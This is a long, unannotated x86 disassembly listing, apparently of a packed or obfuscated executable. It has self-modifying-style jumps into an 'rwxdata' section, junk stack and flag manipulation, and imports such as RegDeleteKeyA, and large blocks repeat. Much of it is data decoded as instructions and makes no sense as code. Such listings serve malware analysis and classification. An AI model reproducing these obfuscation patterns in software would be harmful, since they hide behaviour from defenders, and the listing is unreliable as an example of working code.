cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pop ds
add [ eax ] al
jo rwxdata
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
jne rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
sub_516603
lea esp [ esp + 0x28 ]
je rwxdata
jmp rwxdata
pushfd
stc
cmc
mov [ edi ] eax
bt bx ax
cmp di dx
add esi 0x4
test cx 0xa1d4
call sub_516298
add [ eax ] al
inc edi
je rwxdata
bswap ax
movsx ax bl
mov eax 0x1
pushfd
pushfd
push [ esp ]
pushfd
lea esp [ esp + 0x10 ]
jmp rwxdata
insb
popad
jae rwxdata
popad
jae rwxdata
sete bl
movzx bx bl
not edi
bswap si
pop ebx
jmp rwxdata
add [ ecx ] bh
dec ebp
jne rwxdata
enter 0xf02 0x9c
inc ebp
jb rwxdata
call sub_516af7
push ebx
jb rwxdata
loope rwxdata
js rwxdata
in eax dx
js __export_name_ptr_table_6(MSVCRT:_stat)
insb
imul esi [ fs : esi ] 0xc010c268
jpe rwxdata
inc [ esp + edi * 8 ]
jns rwxdata
enter 0xf02 0x9c
outsd
jb __export_name_ptr_table_6(MSVCRT:_exit)
mov [ edi + 0x3b ] 0x1c
mov edx esi
leave
sbb eax eax
out dx al
nop
imul esp [ ebx + 0x65 ] 0x5af3900
cmp [ edx ] 0xa1
cmp [ eax - 0x1ab9bf28 ] esi
xor eax 0x5b7a2944
in al 0x8d
ror [ ecx - 0x4b045c01 ] 0x1
fist [ esi + 0x7ce9a7e8 ]
add [ eax ] al
inc ebx
jb rwxdata
sbb al 0x8b
salc
mov al 0xa5
and [ edi - 0x2f ] edi
add [ eax ] al
pop edi
jae rwxdata
cmp [ ecx + 0x2e ] ecx
jg rwxdata
inc esi
sbb [ eax ] eax
add dh ah
add [ eax ] al
inc esp
add [ ebx + esi * 2 + 0x74 ] ch
jb rwxdata
add [ eax + 0x49394afc ] ah
rwxdata
add [ eax ] al
pop edi
js rwxdata
xor ebp [ edx - 0x559f0005 ]
mov [ esp ] al
pushad
push [ esp ]
lea esp [ esp + 0x44 ]
jmp rwxdata
jo rwxdata
jno rwxdata
popad
je rwxdata
mov es bp
mov ah 0xe8
add ebp ebp
mov dh 0x0
add [ edi + 0x61 ] bl
jne rwxdata
mov eax [ 0xffffffffd9a99674 ]
test [ eax + 0x28e25614 ] ebx
retn 0xc010
jo rwxdata
je __export_name_ptr_table_3(ADVAPI32:RegDeleteKeyA)
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
dec [ edi ]
test [ ebx ] esi
stosb [ edi ]
sti
jmp [ eax - 0x56 ]
dec eax
popad
jae rwxdata
mov bh 0x87
mov [ 0xffffffffa353a5f2 ] al
mov bl 0x90
shl [ ebx ] 0x1
movsb [ edi ] [ esi ]
xor bl [ ebx - 0x3b ]
adc [ esi + 0x510cd439 ] bl
push ecx

stosd [ edi ]
daa
dec esi
jae rwxdata
scasd [ edi ]
add eax 0x39a13a82
mov al 0xd8
inc eax
inc esi
in eax 0x8e
lds esi [ eax + ebp * 8 + 0x1bc9ed03 ]
shr dh 0x90
add [ gs : ecx ] bh
inc ecx
add [ eax ] al
add [ edi + 0x63 ] bl
push 0x6b74736b
add [ eax ] al
add [ edx + 0x65 ] dl
add [ eax ] al
push edx
inc esp
insb
je rwxdata
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
lea esp [ esp + 0x38 ]
inc esp
popad
je rwxdata
add ah ah
ja rwxdata
add [ eax + 0x53 ] esi
jmp rwxdata
rcl [ edx - 0x1b ] 0x1
jbe rwxdata
push ecx
xor al ah
arpl [ esi ] sp
test al 0x18
jge rwxdata
scasb [ edi ]
dec ebx
jns rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
jmp rwxdata
mov [ 0x648d47e7 ] eax
and al 0x38
add [ eax - 0x5f ] ch
daa
shl dh 0xe8
nop
sbb [ eax ] al
add [ ebx + ecx ] bl
xor al [ edi ]
sbb [ edi - 0x2f ] edx
push edi
0xf671cb49 0xd353
jg rwxdata
insb
and [ ebx + 0x74a13ffa ] 0x85d9a996
cwde
adc al 0x56
loop rwxdata
dec esi
aad 0x64
retn
add [ ebp + 0xf202464 ] cl
test [ edi - 0x1d ] bl
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
je rwxdata
add [ ebp + 0x6c ] al
jb rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
jmp rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_5167c8
pushfd
[ edi ] [ esi ]
movsx esi bl
mov si dx
lea esi [ esi + 0x47b3be68 ]
mov esi [ esp + 0x2c ]
pushfd
push 0x47e7a3cc
lea esp [ esp + 0x38 ]
jmp rwxdata
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
